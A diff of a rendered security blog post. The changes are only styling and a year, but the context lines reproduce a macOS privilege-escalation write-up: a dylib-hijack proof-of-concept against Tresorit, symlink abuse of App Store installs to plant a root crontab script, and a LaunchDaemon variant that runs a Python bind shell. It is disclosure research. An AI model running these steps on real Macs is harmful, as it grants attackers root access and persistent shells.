@@ -58,7 +58,7 @@
   
     
     
-    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css" integrity="sha256-rUj0didZdIhb3APVJR482&#43;FnjFSmP/dyN2sO0q3EaN0=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -235,11 +235,11 @@ or watch his talk on the subject:
 </ol>
 <p><img src="https://theevilbit.github.io/images/Getting_root_with_benign_AppStore_apps/Screen%20Shot%202018-09-12%20at%2014.05.35.png" alt="image1"></p>
 <p>The vulnerability is with Tresorit’s FinderExtension:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
 </span></span></code></pre></div><p>And you can place your dylib here:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpath vulnerability: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/Frameworks/UtilsMac.framework/Versions/A/UtilsMac
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpath vulnerability: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/Frameworks/UtilsMac.framework/Versions/A/UtilsMac
 </span></span></code></pre></div><p>DHS will only show you the first hijackable dylib, but there can be more. Set the DYLD_PRINT_RPATHS variable to 1 in Terminal, and you will see which dylibs the loader tries to load. You can see below that we can hijack two dylibs.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#366">export</span> <span style="color:#033">DYLD_PRINT_RPATHS</span><span style="color:#555">=</span><span style="color:#c30">&#34;1&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#366">export</span> <span style="color:#033">DYLD_PRINT_RPATHS</span><span style="color:#555">=</span><span style="color:#c30">&#34;1&#34;</span>
 </span></span><span style="display:flex;"><span>$ 
 </span></span><span style="display:flex;"><span>$ /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
 </span></span><span style="display:flex;"><span>RPATH failed to expanding     @rpath/UtilsMac.framework/Versions/A/UtilsMac to: /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../Frameworks/UtilsMac.framework/Versions/A/UtilsMac
@@ -249,7 +249,7 @@ or watch his talk on the subject:
 </span></span><span style="display:flex;"><span>Illegal instruction: <span style="color:#f60">4</span>
 </span></span><span style="display:flex;"><span>$ 
 </span></span></code></pre></div><p>Additionally it’s a good idea to double check if the App is compiled with the library-validation option (flag=0x200). That would mean that the OS will verify if all dylibs are signed or not, so you can’t just create anything and use that. Most of the apps are not compiled this way, including Tresorit (but they promised to fix it):</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ codesign -dvvv /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ codesign -dvvv /Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
 </span></span><span style="display:flex;"><span><span style="color:#033">Executable</span><span style="color:#555">=</span>/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/FinderExtension
 </span></span><span style="display:flex;"><span><span style="color:#033">Identifier</span><span style="color:#555">=</span>com.tresorit.mac.TresoritExtension.FinderExtension
 </span></span><span style="display:flex;"><span><span style="color:#033">Format</span><span style="color:#555">=</span>bundle with Mach-O thin <span style="color:#555">(</span>x86_64<span style="color:#555">)</span>
@@ -263,10 +263,10 @@ or watch his talk on the subject:
   </a>
 </h3>
 <p>It’s also something that is super easy based on the talk above, but here it is in short. I made the following POC:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
 </span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdlib.h&gt;</span><span style="color:#099">
 </span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;syslog.h&gt;</span><span style="color:#099">
-</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#c0f">__attribute__</span>((constructor))
 </span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">customConstructor</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
 </span></span><span style="display:flex;"><span> {
@@ -275,9 +275,9 @@ or watch his talk on the subject:
 </span></span><span style="display:flex;"><span>     <span style="color:#c0f">syslog</span>(LOG_ERR, <span style="color:#c30">&#34;Dylib hijack successful in %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, argv[<span style="color:#f60">0</span>]);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The constructor will be called upon loading the dylib. It will print you a line, create a syslog entry, and also start Terminal for you. If the app doesn’t run in sandbox you get a full featured Terminal. Compile it:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib hello.c -o hello-tresorit.dylib -Wl,-reexport_library,<span style="color:#c30">&#34;/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib hello.c -o hello-tresorit.dylib -Wl,-reexport_library,<span style="color:#c30">&#34;/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac&#34;</span>
 </span></span></code></pre></div><p>Then run Patrick’s fixer script. It will fix the dylib version for you (the dylib loader will verify that when loading) and also will add all the exports that are exported by the original dylib. Those exports will actually point to the valid dylib, so when the application loads our crafted version, it can still use all the functions and won’t crash.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 createHijacker.py hello-tresorit.dylib <span style="color:#c30">&#34;/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 createHijacker.py hello-tresorit.dylib <span style="color:#c30">&#34;/Applications/Tresorit.app/Contents/MacOS/TresoritExtension.app/Contents/PlugIns/FinderExtension.appex/Contents/MacOS/../../../../Frameworks/UtilsMac.framework/Versions/A/UtilsMac&#34;</span>
 </span></span><span style="display:flex;"><span>CREATE A HIJACKER <span style="color:#555">(</span>p. wardle<span style="color:#555">)</span>
 </span></span><span style="display:flex;"><span>configures an attacker supplied .dylib to be compatible with a target hijackable .dylib
 </span></span><span style="display:flex;"><span>
@@ -348,7 +348,7 @@ It’s quite good!</p>
   </a>
 </h3>
 <p>This is an open source library for monitoring process creation and termination on macOS. I used the demo project of this library, called ProcInfoExample. It’s a command line utility and will log every process creation, with all the related details, like arguments, signature info, etc… It will give you more information than FE’s Monitor app. It’s output is like:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-03-11 21:18:05.770 procInfoExample<span style="color:#555">[</span>32903:4117446<span style="color:#555">]</span> process start:
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-03-11 21:18:05.770 procInfoExample<span style="color:#555">[</span>32903:4117446<span style="color:#555">]</span> process start:
 </span></span><span style="display:flex;"><span>pid: <span style="color:#f60">32906</span>
 </span></span><span style="display:flex;"><span>path: /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/efw_cache_update
 </span></span><span style="display:flex;"><span>user: <span style="color:#f60">0</span>
@@ -399,7 +399,7 @@ It’s quite good!</p>
   </a>
 </h3>
 <p>The <code>fs_usage</code> utility can monitor file system event very detailed, I would say even too detailed, you need to do some good filtering if you want to get useful data out of it. You get something like this:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229709  getxattr               <span style="color:#555">[</span> 93<span style="color:#555">]</span>           /Applications/Parcel.app                                                                                                                                              0.000017   lsd.4123091
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229709  getxattr               <span style="color:#555">[</span> 93<span style="color:#555">]</span>           /Applications/Parcel.app                                                                                                                                              0.000017   lsd.4123091
 </span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229719  access                       <span style="color:#555">(</span>___F<span style="color:#555">)</span>    /Applications/Parcel.app/Contents                                                                                                                                     0.000005   lsd.4123091
 </span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229819  fstatat64                              <span style="color:#555">[</span>-2<span style="color:#555">]</span>//Applications/Parcel.app                                                                                                                                         0.000013   lsd.4123091
 </span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229927  getattrlist                            /Applications/Parcel.app                                                                                                                                              0.000006   lsd.4123091
@@ -452,7 +452,7 @@ Essentially what we can achieve with this is to drop any files that can be found
 <code>ln -s /opt/myname /Applications/Example.app/Contents/MacOS/Example</code>
 What will happen is that the symlink will be overwritten, when the installd daemon moves the file from the temporary location to the final. You can find the same behaviour if you experiment with the <code>mv</code> command:</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#366">echo</span> aaa &gt; a
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#366">echo</span> aaa &gt; a
 </span></span><span style="display:flex;"><span>$ ln -s a b
 </span></span><span style="display:flex;"><span>$ ls -la
 </span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
@@ -541,7 +541,7 @@ What will happen is that the symlink will be overwritten, when the installd daem
   </a>
 </h3>
 <p>I had no prior knowledge of either Objective C or Swift, but looking on the following syntax for Obj-C, freaked me out:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>myFraction <span style="color:#555">=</span> [[Fraction alloc] init];
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>myFraction <span style="color:#555">=</span> [[Fraction alloc] init];
 </span></span></code></pre></div><p>This is how you call methods of objects and pass parameters. It’s against every syntax I ever knew and I just didn’t want to consume this. So I looked at Swift which looked much nicer in this space and decided to go with that. :)</p>
 <h3 id="learning-swift">
   Learning Swift
@@ -610,24 +610,24 @@ What will happen is that the symlink will be overwritten, when the installd daem
   </a>
 </h2>
 <p>The Crontab Creator app contains a file named ‘root’ as an example for crontab file, along with 9 others. The content is the following:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* * * * * /Applications/Scripts/backup-apps.sh
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* * * * * /Applications/Scripts/backup-apps.sh
 </span></span></code></pre></div><p>Obviously this script doesn’t exists by default, but you can easily create it in the <code>/Application</code> folder, as you have write access, and at that point you can put anything you want into it.</p>
 <p>The steps for the privilege escalation are as follows. First we need to create the app folder structure, and place a symlink there.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
 </span></span><span style="display:flex;"><span>mkdir <span style="color:#c30">&#34;Crontab Creator.app&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Crontab<span style="color:#c30;font-weight:bold">\ </span>Creator.app/
 </span></span><span style="display:flex;"><span>mkdir Contents
 </span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Contents/
 </span></span><span style="display:flex;"><span>ln -s /usr/lib/cron/tabs/ Resources
 </span></span></code></pre></div><p>Then we need to create the script file, which will be run every minute, I choose to run Terminal.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
 </span></span><span style="display:flex;"><span>mkdir Scripts
 </span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Scripts/
 </span></span><span style="display:flex;"><span><span style="color:#366">echo</span> /Applications/Utilities/Terminal.app/Contents/MacOS/Terminal &gt; backup-apps.sh
 </span></span><span style="display:flex;"><span>chmod +x backup-apps.sh
 </span></span></code></pre></div><p>Then we need to install the application from the store. We can do this either via the GUI, or we can do it via the CLI if we install <code>brew</code>, and then <code>mas</code>.</p>
 <p>Commands:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/ruby -e <span style="color:#c30">&#34;</span><span style="color:#069;font-weight:bold">$(</span>curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install<span style="color:#069;font-weight:bold">)</span><span style="color:#c30">&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/ruby -e <span style="color:#c30">&#34;</span><span style="color:#069;font-weight:bold">$(</span>curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install<span style="color:#069;font-weight:bold">)</span><span style="color:#c30">&#34;</span>
 </span></span><span style="display:flex;"><span>brew install mas
 </span></span><span style="display:flex;"><span>mas install <span style="color:#f60">1438725196</span>
 </span></span></code></pre></div><p>In summary utilizing the previous vulnerabilities we can drop the file into the crontab folder, create the script with starting Terminal inside it, and in a minute we got a popup and root access.</p>
@@ -657,7 +657,7 @@ What will happen is that the symlink will be overwritten, when the installd daem
 <code>tar xvf embedded.pkg/Payload</code></li>
 <li>Embedded your file (it can be anywhere and anything):</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mkdir Example.app/Contents/test
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mkdir Example.app/Contents/test
 </span></span><span style="display:flex;"><span>$ <span style="color:#366">echo</span> aaaa &gt; Example.app/Contents/test/a
 </span></span></code></pre></div><ol start="5">
 <li>Recompress the app:
@@ -693,7 +693,7 @@ Developers should build-in some verification of Apple IDs. I’m not sure that i
 </h3>
 <p>This year (2019) I’ve been talking to a few people about this, and it hit me, that I didn’t do any further checks if symlinks are completely broken (during the installation) or not. It turned out that they are still a thing.</p>
 <p>The way the fix is working is that <code>installd</code> has no longer access to the crontab folder (<code>/usr/lib/cron/tabs</code>) even running as root, so it won’t be able to create files there. I’m not even sure that this is a direct fix for my POC or some other coincidence. We can find the related error message in <code>/var/log/install.log</code> (you can use the Console app for viewing logs):</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-01-31 20:44:49+01 csabymac shove<span style="color:#555">[</span>1057<span style="color:#555">]</span>: <span style="color:#555">[</span><span style="color:#033">source</span><span style="color:#555">=</span>file<span style="color:#555">]</span> failed _RelinkFile<span style="color:#555">(</span>/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/C/PKInstallSandboxManager/401FEDFC-1D7B-4E47-A6E9-E26B83F8988F.activeSandbox/Root/Applications/Crontab Creator.app/Contents/Resources/peter, /private/var/at/tabs/peter<span style="color:#555">)</span>: Operation not permitted
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-01-31 20:44:49+01 csabymac shove<span style="color:#555">[</span>1057<span style="color:#555">]</span>: <span style="color:#555">[</span><span style="color:#033">source</span><span style="color:#555">=</span>file<span style="color:#555">]</span> failed _RelinkFile<span style="color:#555">(</span>/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/C/PKInstallSandboxManager/401FEDFC-1D7B-4E47-A6E9-E26B83F8988F.activeSandbox/Root/Applications/Crontab Creator.app/Contents/Resources/peter, /private/var/at/tabs/peter<span style="color:#555">)</span>: Operation not permitted
 </span></span></code></pre></div><h3 id="the-problem">
   The problem
   <a class="heading-link" href="#the-problem">
@@ -722,7 +722,7 @@ Developers should build-in some verification of Apple IDs. I’m not sure that i
 <p><img src="https://theevilbit.github.io/images/Getting_root_with_benign_AppStore_apps/Screenshot%202019-02-12%20at%2010.39.44.png" alt="image6"></p>
 <p>It is really built along the same line as the previous one, but in this case for LaunchDaemons.</p>
 <p>The way to utilize it is:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
 </span></span><span style="display:flex;"><span>mkdir “StartUp.app”
 </span></span><span style="display:flex;"><span><span style="color:#366">cd</span> StartUp.app/
 </span></span><span style="display:flex;"><span>mkdir Contents
@@ -732,9 +732,9 @@ Developers should build-in some verification of Apple IDs. I’m not sure that i
 </span></span><span style="display:flex;"><span>mkdir Scripts
 </span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Scripts/
 </span></span></code></pre></div><p>Here you can create a sample.sh script that will run as root after booting up. For myself I put a bind shell into that script, and after login, connecting to it I got a root shell, but it’s up to you what you put there.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#sample.sh</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#sample.sh</span>
 </span></span><span style="display:flex;"><span>python /Applications/Scripts/bind.py
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#bind.py</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#bind.py</span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#!/usr/bin/python2</span>
 </span></span><span style="display:flex;"><span><span style="color:#c30">&#34;&#34;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#c30">Python Bind TCP PTY Shell - testing version
@@ -824,7 +824,7 @@ Developers should build-in some verification of Apple IDs. I’m not sure that i
     
       2019 -
     
-    2025
+    2026
      Csaba Fitzl 
     ·
     
